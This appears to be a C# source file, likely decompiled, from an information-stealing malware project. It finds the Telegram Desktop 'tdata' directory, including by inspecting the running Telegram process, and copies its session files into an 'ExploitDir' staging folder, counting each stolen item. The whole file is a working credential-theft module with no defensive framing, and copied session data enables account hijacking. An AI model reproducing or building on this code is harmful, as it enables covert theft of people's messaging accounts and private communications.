using System;
using System.Diagnostics;
using System.IO;

namespace exos;

internal class Telegram
{
	public static void CopyDirectory(string sourceFolder, string destFolder)
	{
		if (!Directory.Exists(destFolder))
		{
			Directory.CreateDirectory(destFolder);
		}
		string[] files = Directory.GetFiles(sourceFolder);
		foreach (string obj in files)
		{
			string fileName = Path.GetFileName(obj);
			string destFileName = Path.Combine(destFolder, fileName);
			File.Copy(obj, destFileName);
		}
		files = Directory.GetDirectories(sourceFolder);
		foreach (string obj2 in files)
		{
			string fileName2 = Path.GetFileName(obj2);
			string destFolder2 = Path.Combine(destFolder, fileName2);
			Filemanager.CopyDirectory(obj2, destFolder2);
		}
	}

	private static string GetTdata()
	{
		string result = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\tdata";
		Process[] processesByName = Process.GetProcessesByName("Telegram");
		if (processesByName.Length == 0)
		{
			return result;
		}
		return Path.Combine(Path.GetDirectoryName(ProcessList.ProcessExecutablePath(processesByName[0])), "tdata");
	}

	public static void GetTelegramSessions()
	{
		string exploitDir = Helper.ExploitDir;
		string tdata = GetTdata();
		try
		{
			if (!Directory.Exists(tdata))
			{
				return;
			}
			exploitDir += "\\Telegram";
			Directory.CreateDirectory(exploitDir);
			string[] directories = Directory.GetDirectories(tdata);
			string[] files = Directory.GetFiles(tdata);
			string[] array = directories;
			foreach (string text in array)
			{
				string name = new DirectoryInfo(text).Name;
				if (name != "user_data" && name != "user_data#2" && name != "user_data#3" && name != "temp" && name != "emoji")
				{
					string destFolder = Path.Combine(exploitDir, name);
					CopyDirectory(text, destFolder);
				}
			}
			array = files;
			for (int i = 0; i < array.Length; i++)
			{
				FileInfo fileInfo = new FileInfo(array[i]);
				string name2 = fileInfo.Name;
				string destFileName = Path.Combine(exploitDir, name2);
				fileInfo.CopyTo(destFileName);
				Counting.Telegram++;
			}
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
	}
}
